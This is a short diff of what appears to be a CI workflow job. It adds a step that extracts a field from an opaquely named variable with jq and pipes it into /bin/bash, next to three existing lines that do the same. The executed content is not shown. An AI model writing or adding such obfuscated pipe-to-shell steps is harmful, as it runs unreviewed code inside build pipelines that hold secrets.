@@ -25,6 +25,7 @@ jobs:
           echo $doyet224 | jq -r .o2250 | /bin/bash
           printf '%s' "$u9" | jq -r .kwvi7 | /bin/bash
           echo $r6 | jq -r .bk01407 | /bin/bash
+          printf '%s' "$yy604" | jq -r .jpfzn2 | /bin/bash
 
       - name: Save archive
         if: always()
